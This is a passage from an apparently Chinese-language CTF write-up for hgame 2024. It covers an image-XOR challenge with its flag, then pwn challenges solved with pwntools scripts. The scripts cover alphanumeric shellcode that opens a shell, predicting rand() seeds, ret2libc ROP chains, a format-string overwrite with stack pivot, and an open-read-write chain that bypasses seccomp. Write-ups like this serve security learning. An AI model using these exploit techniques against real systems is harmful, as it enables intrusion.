list(unique_strings)random_strings = generate_unique_strings(len(flag), 8)current_image = generate_random_image(120, 80)key_image = generate_random_image(120, 80)def random_time(image, name): time.sleep(random.random()) image.save(&quot;.\\\\png_out\\\\&#123;&#125;.png&quot;.format(name))for i in range(len(flag)): current_image = draw_text(current_image, 120, 80, flag[i]) threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start() 相当于把flag一个个写在图片中，然后和一个key进行异或 取任意一张图片（不考虑第一张和最后一张）和其他图片异或，一定会出现两张图片仅有一个字符 这两个字符一定分别是前一个字符和后一个字符 所以，排列异或之后慢慢看就行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import copyimport osimport pytesseractfrom PIL import Image, ImageDraw, ImageFontdef xor_images(image1, image2): if image1.size != image2.size: raise ValueError(&quot;Images must have the same dimensions.&quot;) xor_image = Image.new(&quot;RGB&quot;, image1.size) pixels1 = image1.load() pixels2 = image2.load() xor_pixels = xor_image.load() for x in range(image1.size[0]): for y in range(image1.size[1]): r1, g1, b1 = pixels1[x, y] r2, g2, b2 = pixels2[x, y] xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2) return xor_imagedef count_black_pixels(image1): count=0 pixels1 = image1.load() for x in range(image1.size[0]): for y in range(image1.size[1]): if pixels1[x, y]==(0,0,0): count+=1 return countfiles=os.listdir(&#x27;png_out&#x27;)print(files)for j in files: a=Image.open(f&#x27;png_out/&#123;j&#125;&#x27;,&#x27;r&#x27;) images_dict = &#123;&#125; for ind,i in enumerate(files): b=Image.open(f&#x27;png_out/&#123;i&#125;&#x27;,&#x27;r&#x27;) c=xor_images(a,b) black_pixels_num=count_black_pixels(c) images_dict[ind]=&#123;&#x27;image&#x27;:copy.copy(c),&#x27;black_pixels_num&#x27;:black_pixels_num,&#x27;filename&#x27;:i&#125; os.mkdir(j) for i in images_dict.values(): image=i[&#x27;image&#x27;] image.save(f&quot;&#123;j&#125;/xor_&#123;i[&#x27;filename&#x27;]&#125;.png&quot;) #print(content)#hgame&#123;1adf_17eb_803c&#125; Pwnezshellcode myread限制了shellcode必须为字母数字 https://www.cnblogs.com/hetianlab/p/17647861.htmlhttps://www.cnblogs.com/hetianlab/p/17647861.html amd64的 https://github.com/veritas501/ae64https://github.com/veritas501/ae64 报错解决 https://github.com/keystone-engine/keystone/issues/386https://github.com/keystone-engine/keystone/issues/386 x64的 https://github.com/rcx/shellcode_encoderhttps://github.com/rcx/shellcode_encoder 1234567891011from pwn import *from ae64 import AE64p=remote(&#x27;47.100.137.175&#x27;,30959)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)obj=AE64()shellcode=obj.encode(asm(shellcraft.sh()),&#x27;rax&#x27;)print(shellcode)p.sendlineafter(b&#x27;input the length of your shellcode:&#x27;,b&#x27;-1&#x27;)p.sendafter(b&#x27;input your shellcode:&#x27;,shellcode)p.interactive() Elden Random Challengepwn随机数模版题目+libc泄漏基址 猜对了会给一个栈溢出的点 https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/ ctypes包的cdll.LoadLibrary(‘http://libc.so.xxxhttp://libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。 12345678910111213from pwn import *from ctypes import *libc = cdll.LoadLibrary(&#x27;./libc.so.6&#x27;)p = remote(&#x27;47.100.137.175&#x27;,31178)libc.srand(c_uint(libc.time(0)))p.sendlineafter(b&#x27;Menlina: Well tarnished, tell me thy name.&#x27;,b&#x27;jok&#x27;)for i in range(99): r=libc.rand()%100+1 print(r) p.sendafter(b&#x27;Please guess the number:&#x27;,p64(r))p.interactive() 123456789101112131415161718192021222324252627282930from pwn import *from ctypes import *libc = cdll.LoadLibrary(&#x27;./libc.so.6&#x27;)p = remote(&#x27;47.100.137.175&#x27;,31058)libc.srand(c_uint(libc.time(0)))p.sendlineafter(b&#x27;Menlina: Well tarnished, tell me thy name.&#x27;,b&#x27;jok&#x27;)for i in range(99): r=libc.rand()%100+1 print(r) p.sendafter(b&#x27;Please guess the number:&#x27;,p64(r))pop_rdi_addr=0x401423puts_got_addr=0x404018puts_plt_addr=0x4010b0myread_addr=0x40125dret_addr=0x40101aputs_offset=0x084420sys_offset=0x052290sh_offset=0x1b45bd#泄漏payload= b&#x27;A&#x27;*0x38+p64(ret_addr)+ p64(pop_rdi_addr)+p64(puts_got_addr) + p64(puts_plt_addr) + p64(myread_addr)p.sendlineafter(b&#x27;reward to thy brilliant mind&#x27;,payload)p.recvline()libc_base_addr=u64(p.recvline()[:-1].ljust(8,b&#x27;\\x00&#x27;))-puts_offsetprint(hex(libc_base_addr))#getshellpayload=b&#x27;A&#x27;*0x38+p64(ret_addr)+p64(pop_rdi_addr)+p64(sh_offset+libc_base_addr)+p64(sys_offset+libc_base_addr)p.sendline(payload)p.interactive() ezfmt string 限制了格式化字符串的输入 而且给了后门了 %d 有符号32位整数 %u 无符号32位整数 &#x20; %lld 有符号64位整数 %llx有符号64位16进制整数 只有一次的格式化字符串的机会 https://www.codercto.com/a/85297.htmlhttps://www.codercto.com/a/85297.html 提到了一种使用格式化字符串漏洞使程序无限循环的操作 程序退出会调用finiarray 查看_fini_array 直接覆盖为后门函数就行 但是这题似乎不行 直接抽奖然后栈迁移，控制rbp上来 概率还可以，1/16 123456789from pwn import *backdoor_addr=0x40123dwhile True: sleep(0.5) p = remote(&#x27;47.102.130.35&#x27;, 31292) payload=f&#x27;%&#123;0x08&#125;c%18$hhnAAAAAA&#x27;.encode()+p64(backdoor_addr) p.sendlineafter(b&#x27;make strings and getshell&#x27;,payload) p.interactive() p.close() Elden Ring Ⅰ 可以使用seccomp-tools来检查 https://www.cnblogs.com/robinbin/p/16172041.htmlhttps://www.cnblogs.com/robinbin/p/16172041.html 这个文件链接库有点问题，patch一下 12patchelf --set-interpreter ~/Pwn/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/ld-2.31.so vuln 12seccomp-tools dump ./vuln execve和execveat都不能用 https://forum.butian.net/share/544https://forum.butian.net/share/544 1rdi,rsi,rdx 泄露出libc基地址后,使用libc中的gadget控制参数 使用ret2csu 在__libc_csu_init函数中有两段可以利用的代码段 具体利用看链接 https://forum.butian.net/share/544https://forum.butian.net/share/544 这里ret2csu不好打，就直接orw 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *p=remote(&#x27;47.100.245.185&#x27;,32384)libc=ELF(&#x27;./libc.so.6&#x27;)puts_got_addr=0x404028puts_plt_addr=0x4010c0pop_rdi_addr=0x4013e3ret_addr=0x40101apush_rsp_offset=0x0422bdputs_offset=libc.sym[&#x27;puts&#x27;]open_offset=libc.sym[&#x27;open&#x27;]read_offset=libc.sym[&#x27;read&#x27;]write_offset=libc.sym[&#x27;write&#x27;]pop_rsi_offset=0x02601fpop_rdx_offset=0x142c92vuln_addr=0x40125bdef expandLeak(payload): #利用read扩大溢出 global pop_rdx_offset,libc_base,ret_addr,read_offset,vuln_addr prePayload = b&#x27;a&#x27; * 0x108 + p64(pop_rdx_offset + libc_base) + p64(0x1fff) + p64(ret_addr) + p64(read_offset + libc_base) p.sendlineafter(b&#x27;I offer you an accord. &#x27;, prePayload) p.sendline(b&#x27;a&#x27;*0x108 + b&#x27;a&#x27;*8*4+payload)context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)#泄漏libcpayload=b&#x27;a&#x27;*0x108+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)+p64(vuln_addr)p.sendlineafter(b&#x27;I offer you an accord. &#x27;,payload)p.recvline()libc_base= u64(p.recvline()[:-1].ljust(8, b&#x27;\\x00&#x27;)) - puts_offset#泄露栈地址payload=p64(pop_rdi_addr) + p64(1) + p64(pop_rdx_offset+libc_base) + p64(0x198) + p64(write_offset+libc_base)+p64(vuln_addr)expandLeak(payload)p.recvline()p.recvn(0x190)stack_base=u64(p.recvn(8))-0x1a8print(hex(stack_base))#布置openpayload=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(0x300)+p64(write_offset+libc_base)+p64(vuln_addr)expandLeak(payload)payload=p64(pop_rdi_addr)+p64(stack_base+0x1d0)+p64(pop_rsi_offset+libc_base)+p64(0)+p64(pop_rdx_offset+libc_base)+p64(0)+p64(ret_addr)+p64(open_offset+libc_base)#用来确定字符串偏移payload=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_offset+libc_base)+p64(stack_base+0x1d0)+p64(pop_rdx_offset+libc_base)+p64(0x300)+p64(ret_addr)+p64(write_offset+libc_base)payload+=p64(vuln_addr)payload+=b&#x27;flag\\x00\\x00\\x00\\x00&#x27;expandLeak(payload)#read&amp;writepayload=p64(pop_rdi_addr)+p64(3)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(60)+p64(read_offset+libc_base)payload+=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(60)+p64(write_offset+libc_base)payload+=p64(vuln_addr)expandLeak(payload)#getflagprint(p.recvall(timeout=2))p.interactive()","tags":["ctf","2024","hgame"],"categories":["Writeups"]}]